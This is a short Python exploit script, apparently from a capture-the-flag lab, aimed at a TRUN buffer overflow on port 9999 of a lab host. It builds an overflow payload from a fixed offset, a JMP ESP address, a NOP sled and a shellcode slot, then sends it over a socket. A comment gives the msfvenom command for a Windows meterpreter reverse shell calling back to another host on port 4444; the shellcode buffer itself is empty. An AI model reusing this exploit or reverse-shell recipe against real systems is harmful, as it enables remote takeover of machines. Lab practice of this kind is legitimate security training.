#!/tmp/CTF/test/bin/python                                                                                                                                                          [109/119]

import socket
import struct

total_length = 2984
host_ip = "172.28.128.47"
port = 9999
offset = 2003
jmp_esp = struct.pack("<I" ,0x062501203)
#all_characters = b"".join([struct.pack('<B', x) for x in range(1,256)])
nop = b"\x90"*20
buf =  b"" #msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.28.128.54 LPORT=4444 -b "\x00" -f python

shell = buf

payload = [
        b"TRUN /.:/",
        b"A"*offset,
        jmp_esp,
        nop,
        shell,
        b"C"*(total_length - offset - len(jmp_esp) - len(nop) -len(shell))
        ]

payload =b"".join(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host_ip, port))

s.send(payload)

s.close()

